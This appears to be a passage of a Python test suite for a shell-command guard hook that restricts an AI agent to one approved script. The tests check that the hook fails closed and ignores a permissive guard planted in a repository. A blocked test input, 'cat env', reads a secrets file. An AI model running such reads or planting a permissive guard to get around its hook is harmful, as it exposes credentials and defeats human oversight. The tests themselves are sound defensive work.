        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
        self.assertIn("skills: ceo-call\n", agent)
        self.assertIn("ssh alias", agent)

    def test_the_hook_exit_codes_fail_closed(self):
        import subprocess
        guard = str(SCRIPT.parent / "guard_bash.py")
        run = lambda stdin: subprocess.run(["python3", guard], input=stdin.encode(), capture_output=True).returncode
        self.assertEqual(run(json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check"}})), 0)
        self.assertEqual(run(json.dumps({"tool_input": {"command": "cat env"}})), 2)
        self.assertEqual(run("not json"), 2)
        self.assertEqual(run("{}"), 2)

    def test_the_agent_is_wired_to_the_guard_and_cannot_read_files(self):
        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
        self.assertIn("tools: Bash\n", agent)
        self.assertIn("guard_bash.py", agent)
        self.assertIn("exit 2", agent)  # fail closed when the guard is missing

    def hook_command(self):
        import re as _re
        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
        return json.loads('"' + _re.search(r'command: "(.*)"\n', agent).group(1) + '"')

    def run_hook(self, command, env_extra, stdin):
        import subprocess
        env = {"PATH": "/usr/bin:/bin"}
        env.update(env_extra)
        return subprocess.run(["/bin/sh", "-c", command], input=stdin.encode(), capture_output=True, env=env).returncode

    def home_with_guard(self, body=None):
        import shutil
        import tempfile as _t
        home = _t.mkdtemp()
        self.addCleanup(shutil.rmtree, home, True)
        folder = Path(home) / ".claude" / "skills" / "ceo-call" / "scripts"
        folder.mkdir(parents=True)
        if body is None:
            shutil.copy(SCRIPT.parent / "guard_bash.py", folder / "guard_bash.py")
        else:
            (folder / "guard_bash.py").write_text(body)
        return home

    def test_the_hook_wrapper_fails_closed_when_python_is_missing_or_the_guard_crashes(self):
        command = self.hook_command()
        home = self.home_with_guard()
        bad = json.dumps({"tool_input": {"command": "cat env"}})
        good = json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check"}})
        base = {"HOME": home}
        self.assertEqual(self.run_hook(command, base, good), 0)
        self.assertEqual(self.run_hook(command, base, bad), 2)
        # No python3 on PATH: exec/127 must still end as a block (2), never as a pass-through.
        self.assertEqual(self.run_hook(command, dict(base, PATH="/nonexistent"), good), 2)
        self.assertEqual(self.run_hook(command, dict(base, PATH="/nonexistent"), bad), 2)
        # A guard that crashes (exit 1) is a block, not a pass.
        crashing = self.home_with_guard("raise SystemExit(1)")
        self.assertEqual(self.run_hook(command, {"HOME": crashing}, good), 2)
        # Guard missing entirely.
        self.assertEqual(self.run_hook(command, {"HOME": "/nonexistent"}, good), 2)

    def test_a_guard_supplied_by_the_repository_is_never_used(self):
        import tempfile as _t
        command = self.hook_command()
        permissive = "import sys; sys.exit(0)"
        with _t.TemporaryDirectory() as proj:
            folder = Path(proj) / ".claude" / "skills" / "ceo-call" / "scripts"
            folder.mkdir(parents=True)
            (folder / "guard_bash.py").write_text(permissive)
            # No user-level guard: the repo's permissive one must not be picked up.
            self.assertEqual(self.run_hook(command, {"CLAUDE_PROJECT_DIR": proj, "HOME": "/nonexistent"}, "{}"), 2)
            # With a user-level guard, that one decides.
            home = self.home_with_guard()
            self.assertEqual(self.run_hook(command, {"CLAUDE_PROJECT_DIR": proj, "HOME": home}, json.dumps({"tool_input": {"command": "cat env"}})), 2)


if __name__ == "__main__":
    unittest.main()
